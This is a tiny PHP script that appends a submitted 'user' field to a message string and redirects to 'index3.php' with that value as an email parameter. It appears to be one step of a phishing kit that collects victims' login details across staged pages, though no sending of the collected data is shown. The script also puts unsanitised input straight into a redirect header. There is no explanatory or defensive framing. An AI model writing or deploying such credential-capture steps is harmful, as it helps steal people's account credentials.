<?php

$message .= "User : ".$_POST['user']."\n";

$a = "index3.php?email=".$_POST['user'];
    header("Location: ".$a);
exit;
?>